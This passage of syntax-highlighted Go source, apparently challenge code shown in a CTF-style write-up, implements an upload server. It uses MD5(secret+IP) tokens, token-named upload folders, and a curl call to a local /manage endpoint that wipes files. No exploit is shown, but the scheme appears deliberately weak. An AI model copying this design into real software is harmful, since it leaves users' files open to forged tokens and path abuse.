&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 验证token
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">dir&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 带着token获取已经上传的文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadDir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">f&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#00a8c8">range&lt;/span> &lt;span style="color:#75af00">files&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Name&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ListFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Files&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">fs&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">type&lt;/span> &lt;span style="color:#75af00">UploadFileResult&lt;/span> &lt;span style="color:#00a8c8">struct&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">Code&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;code&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">uploadFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;GET&amp;#34;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">values&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">URL&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Query&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">values&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;token&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// get方式传入token参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">RemoteAddr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fromHost&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">fromHostList&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 验证token
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">token&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fromHost&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">dir&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uploads&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 将获取到的token新建文件夹
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Stat&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">MkdirAll&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0766&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">ioutil&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ReadDir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">files&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Command&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;curl&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1:9091/manage&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 如果文件大于五个 则本地访问9091/manage删除所有文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">command&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ParseMultipartForm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">FormFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">()})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fileName&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">RandStringBytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">OpenFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">filepath&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">dir&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">fileName&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">O_WRONLY&lt;/span>&lt;span style="color:#111">|&lt;/span>&lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">O_CREATE&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0666&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">defer&lt;/span> &lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">f&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#75af00">fileName&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">json&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Marshal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">UploadFileResult&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#75af00">Code&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;ERROR TOKEN&amp;#34;&lt;/span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">msg&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">checkToken&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">token&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#00a8c8">string&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">bool&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">data&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">SecretKey&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">has&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sum&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">md5str&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Sprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;%x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">md5str&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#75af00">token&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">IndexHandler&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ServeFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">r&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dist/index.html&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">file&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">os&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;secret/key&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// 读secret/key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">err&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panic&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
